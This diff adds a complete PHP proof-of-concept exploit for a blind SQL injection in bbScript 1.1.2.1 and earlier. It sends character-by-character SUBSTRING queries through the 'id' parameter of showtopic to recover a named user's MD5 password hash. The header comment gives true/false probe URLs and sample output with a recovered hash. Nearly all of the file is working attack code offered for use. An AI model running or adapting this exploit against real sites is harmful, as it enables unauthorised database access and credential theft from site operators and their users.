@@ -1,0 +1,76 @@
+<?php
+
+/*
+
+bbScript <= 1.1.2.1 (id) Blind SQL Injection Exploit
+Bug found && exploited by cOndemned
+Greetz: All friends, TWT, SecurityReason Team, Scruell ;*
+
+Download: http://www.bbscript.com/download.php 
+Note: You have to be logged into in order to download this script
+
+
+/[bbScript_path]/index.php?action=showtopic&id=1+and+1=1--	TRUE	(normal)
+/[bbScript_path]/index.php?action=showtopic&id=1+and+1=2--	FALSE	(error)
+
+
+example:
+
+condemned@agonia:~$ php bbscript-poc.php http://localhost/audits/bbScript admin
+
+[~] bbScript <= 1.1.2.1 (id) Blind SQL Injection Exploit
+[~] Bug found && exploited by cOndemned
+[~] Target username set to admin
+[~] Password Hash : 596a96cc7bf9108cd896f33c44aedc8a
+[~] Done
+
+*/
+
+	
+function concat($string)
+{
+	$length = strlen($string);
+	$output = '';
+
+	for($i = 0; $i < $length; $i++) $output .= sprintf("CHAR(%d),", ord($string[$i]));
+
+	return 'CONCAT(' . substr($output, 0, -1) . ')';
+}
+
+echo "\n[~] bbScript <= 1.1.2.1 (id) Blind SQL Injection Exploit";
+echo "\n[~] Bug found && exploited by cOndemned\n";
+
+if($argc != 3)
+{
+	printf("[!] Usage: php %s <target> <login>\n\n", $argv[0]);
+	exit;
+}
+
+list(, $target, $login) = $argv;
+
+echo "[~] Target username set to $login\n";
+	
+$login = concat($login);
+$chars = array_merge((array)$chars, range(48, 57), range(97, 102));
+$pos   = 1;
+
+echo "[~] Password Hash : ";
+
+while($pos != 33)
+{
+	for($i = 0; $i <= 16; $i++)
+	{
+		$query  = "/index.php?action=showtopic&id=1+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=$login),$pos,1)=CHAR({$chars[$i]})--";
+
+		if(!preg_match('#Error#', file_get_contents($target . $query), $resp))
+		{
+			printf("%s", chr($chars[$i]));
+			$pos++;
+			break;
+		}
+	}
+}
+
+echo "\n[~] Done\n\n";
+
+?>
